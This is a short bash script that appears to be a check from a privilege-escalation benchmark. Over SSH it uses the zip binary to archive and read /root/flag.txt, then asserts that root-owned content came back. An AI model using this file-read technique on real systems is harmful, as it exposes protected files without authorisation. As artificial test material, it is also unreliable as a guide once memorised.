#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
rm -f /tmp/bench.zip
/usr/bin/zip -q /tmp/bench.zip /root/flag.txt
python3 - <<'\''PY'\''
import zipfile
z = zipfile.ZipFile("/tmp/bench.zip")
name = next(n for n in z.namelist() if n.endswith("flag.txt"))
print(z.read(name).decode())
PY
')"
assert_root_output "${out}"
